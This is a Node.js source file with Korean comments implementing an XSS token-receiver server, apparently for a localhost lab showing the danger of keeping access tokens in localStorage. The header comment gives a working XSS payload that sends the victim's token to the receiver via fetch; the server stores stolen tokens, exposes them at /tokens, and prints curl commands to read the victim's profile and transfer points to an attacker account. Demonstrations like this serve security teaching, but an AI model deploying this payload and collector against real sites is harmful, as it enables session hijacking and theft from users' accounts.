/**
 * XSS Token Receiver (port 4999)
 * ─────────────────────────────────────────────────────────────
 * V1 공격 시나리오:
 *   1. victim이 V1 모드로 로그인 → AT가 localStorage['at']에 저장됨
 *   2. 게시글 페이지에 심긴 XSS 페이로드 실행:
 *      <img src=x onerror="fetch('http://localhost:4999/steal?t='+localStorage.getItem('at'))">
 *   3. 이 서버가 토큰을 수집하여 콘솔 + 메모리에 기록
 *   4. 공격자가 GET /tokens 로 탈취 목록 확인
 *   5. 탈취한 AT로 /auth/v1/me, /api/points/transfer 등 직접 호출 가능
 * ─────────────────────────────────────────────────────────────
 */

const http = require('http');
const url = require('url');

const stolenTokens = [];

const server = http.createServer((req, res) => {
  // CORS — 브라우저 fetch가 결과를 읽을 수 있게 허용 (공격 자체는 CORS 없어도 성공)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const parsed = url.parse(req.url, true);

  // ── 토큰 수집 엔드포인트 ────────────────────────────────────
  if (parsed.pathname === '/steal') {
    const token = parsed.query.t;
    if (token) {
      const entry = {
        token,
        preview: `${token.substring(0, 40)}...`,
        timestamp: new Date().toISOString(),
        ip: req.socket.remoteAddress,
      };
      stolenTokens.push(entry);

      console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
      console.log('🔥 [XSS 공격 성공] 토큰 탈취!');
      console.log(`   시각   : ${entry.timestamp}`);
      console.log(`   IP     : ${entry.ip}`);
      console.log(`   Token  : ${entry.preview}`);
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
      console.log('다음 명령어로 피해자 정보 조회:');
      console.log(`  curl http://localhost:4001/auth/v1/me -H "Authorization: Bearer ${token}"`);
      console.log('포인트 탈취:');
      console.log(`  curl -X POST http://localhost:4001/api/points/transfer \\`);
      console.log(`    -H "Authorization: Bearer ${token}" \\`);
      console.log(`    -H "Content-Type: application/json" \\`);
      console.log(`    -d '{"toEmail":"hacker@test.com","amount":1000000}'\n`);
    }
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('ok');
    return;
  }

  // ── 탈취 목록 조회 ───────────────────────────────────────────
  if (parsed.pathname === '/tokens') {
    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
    res.end(JSON.stringify({ count: stolenTokens.length, tokens: stolenTokens }, null, 2));
    return;
  }

  res.writeHead(404);
  res.end('Not Found');
});

server.listen(4999, () => {
  console.log('┌─────────────────────────────────────────────┐');
  console.log('│  XSS Token Receiver — port 4999             │');
  console.log('│  수신 대기 중...                             │');
  console.log('├─────────────────────────────────────────────┤');
  console.log('│  탈취 목록:  http://localhost:4999/tokens   │');
  console.log('│  공격 흐름:  victim이 V1 모드로 /posts 접속 │');
  console.log('└─────────────────────────────────────────────┘');
});
